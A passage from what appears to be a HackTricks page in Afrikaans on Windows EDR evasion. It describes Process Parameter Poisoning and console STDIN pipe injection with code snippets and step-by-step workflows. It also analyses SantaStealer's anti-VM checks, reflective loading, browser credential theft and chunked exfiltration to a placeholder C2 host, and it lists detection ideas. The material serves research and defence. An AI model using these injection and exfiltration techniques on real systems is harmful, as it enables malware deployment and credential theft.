- Afgeleë skryfbewerkings na image-backed uitvoerbare bladsye (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX-toekennings.
- Export-ingangspunte waarvan die grepe in geheue nie meer ooreenstem met die rugsteunlêer op skyf nie.
- Afgeleë threads of context pivots wat met uitvoering begin binne ’n legitieme DLL-export waarvan die eerste grepe onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur draadskepping.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke afgeleë skryfpad (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om grepe na ’n reeds lopende teiken te kopieer, misbruik dit die feit dat Windows geselekteerde `CreateProcessW`-opstartparameters na die child process **kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers wat deur `CreateProcessW` gekopieer word

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese carrier-beperkings:

- `lpCommandLine` moet na **skryfbare geheue** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode-karakters**, insluitend die nulterminator.
- `lpEnvironment` moet ’n Unicode-omgewingsblok wees met opeenvolgende `NAME=VALUE\0`-stringe wat deur ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, daarom moet die `ShellInfo`-kartering as ’n implementeringsdetail eerder as ’n stabiele, gedokumenteerde kontrak beskou word.

Dit maak normale prosesskepping die **payload-oordragprimitief**. Die operateur skep die child process met aanvallerbeheerde opstartdata en laat Windows die kopieerbewerking tussen prosesse uitvoer.

### Afgeleë opsoekvloei sonder remote write APIs

Nadat die child geskep is, vind jy die gekopieerde buffer met **read-only** primitiewe:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die afgeleë `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Uitvoering van die gekopieerde parameterbuffer

Die gekopieerde parametergebied is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-handle wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread hijacking-werkvloeie, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggekeerde hoofthread-handle verander word.

Dit vermy verskeie API’s wat algemeen vir inspuiting gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou loonvrag wat `0x00` bevat, tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulgrepvrye eerste fase** wat konstantes tydens runtime herkonstrueer en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantesintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium toe om stack-strings, API-argumente, DLL-paaie of ’n tweede-stadium shellcode-loader te bou sonder om null-bytes in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe pointers stel
- `RSP` **16-byte-belyn** hou voor die oproep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word en uitgevoer word, wat ’n direkte RWX-toekenning vermy.

### Opsporingsidees

Goeie jaggeleenthede wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **process-parameter-bladsye uitvoerbaar maak**
- daardie beskermingsverandering gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë leesbewerkings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropie-waardes vir `lpCommandLine`, `lpEnvironment` of `STARTUPINFO.lpReserved` tydens proseskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering van uitvoertoestemming en ’n metode om die uitvoering te herlei.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

## Console STDIN-pyp-inspuiting

’n Interaktiewe console-child kan ook as die **payload-oordragprimitief** gebruik word. Die injector herlei die child se standard input na ’n pyp en stuur ’n merker gevolg deur shellcode. Nadat die console-program die data in sy eie private geheue gelees het, vind die injector daardie buffer, maak dit uitvoerbaar en herlei ’n child-thread daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar dit bly process injection eerder as ’n algemene EDR-bypass.<sup>[[41]](#references)</sup>

Ten spyte van die beskrywing “named-pipe” roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonymous pipe** skep. Windows implementeer anonymous pipes intern met uniek benoemde pipe-objekte, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad nie en roep ook nie `CreateNamedPipe` aan nie. Dit skep oorerfbare handles met ’n verstek-sekuriteitsbeskrywer, plaas die lees-handle in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` in en begin ’n nuwe child met handle-oorerwing geaktiveer. Daarom begin hierdie PoC die verskafde console-uitvoerbare lêer; dit koppel nie sy pyp aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep anonymous pipe-pare vir die child se `STDIN` en `STDOUT`. Skakel oorerwing vir die twee handles aan die ouer se kant af en maak die child-side duplikate in die ouer toe nadat die proses geskep is.
2. Begin ’n interaktiewe uitvoerbare lêer soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die child erf die herleide standard handles.
3. Stuur die volledige binêre `rawData`-skikking met `WriteFile` deur die `STDIN`-handle aan die ouer se kant. Die console-program verwerk die grepe en laat ’n kopie in een van sy private toegewyde geheuegebiede agter.
4. Loop deur die child se adresruimte met `VirtualQueryEx`, lees kandidaat-`MEM_PRIVATE`-gebiede met `ReadProcessMemory` en soek die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer se beskerming na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hooftread, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is spesifiek vir x64: dit wysig `CONTEXT.Rip`, en die ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin die uitvoerbare grepe by heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou dié uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam by. Die bronkommentaar lys ook `0x0A`, `0x0D` en `0x1A` as slegte karakters. Hierdie werkvloei verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Vir klein inheemse helpers en payload-kompilasiepatrone, sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer se tradecraft vir Fileless-ontduiking en Diefstal van geloofsbriewe

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne infostealers AV-bypass, anti-analise en toegang tot geloofsbriewe in ’n enkele werkvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleg-gating en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, laat die sample ’n leë `CIS`-merker agter en beëindig dit voordat die stealers loop. So ontplof dit nooit op uitgeslote plekke nie, terwyl dit ’n artefak vir opsporing agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die process-lys, hasheer elke naam met ’n pasgemaakte rolling checksum en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die checksum vir die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B inspekteer stelseleienskappe (minimum aantal processes, onlangse uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox-additions op te spoor en doen tydsberekeningskontroles rondom sleeps om single-stepping raak te sien. Enige treffer laat die proses staak voordat modules begin.

### Fileless helper + dubbele ChaCha20 reflective loading

- Die primêre DLL/EXE sluit ’n Chromium credential helper in wat óf na skyf geskryf óf met die hand in die geheue gemap word; in fileless-modus los dit self imports/relocations op sodat geen helper artifacts geskryf word nie.
- Dié helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-byte-sleutels + 12-byte-nonces). Ná albei rondtes laai dit die blob reflectively (geen `LoadLibrary` nie) en roep die exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/cookies/kredietkaartdata direk uit SQLite-databasisse te dekripteer, ondanks ABE-hardening.

### Modulêre in-memory-insameling en HTTP-exfil in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n join-venster van ongeveer 45 sekondes.
- Wanneer dit klaar is, word alles met die staties gelinkte `miniz`-library as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15 sekondes en stuur die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, met ’n vervalste `multipart/form-data`-boundary van ’n blaaier (`----WebKitFormBoundary***`). Elke stuk voeg `User-Agent: upload`, `auth: <build_id>` en, opsioneel, `w: <campaign_tag>` by; die laaste stuk voeg `complete: true` by sodat die C2 weet dat die herbouing klaar is.

## References

- [1] [Gevorderde ontduikingstegnieke: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: geen gratis passe meer vir malware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir call-stack-spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde obfuskasie vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Om Zscaler se posture-kontroles te omseil](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: ’n Verkenning van Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van forwarded exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process-sekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Om EDR’s teë te werk met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek die beskermende dop van Windows Defender met die Folder Redirect-tegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure Curtain: Van RAT tot Builder tot Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom stad toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption-dekripsie](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Bekamping van Node.js-malware met API-tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix aan die slaap sus met Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET en Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-slaapobfuskasie](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Verberg jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Misbruik van Chrome Remote Desktop tydens Red Team-bedrywighede: ’n Praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender se Remediation Driver as ’n kernel-operation primitive bewapen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec se bykomende kode vir Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Skep selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole-bronkode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe-funksie](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Skep ’n child process met herlei invoer en uitvoer](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
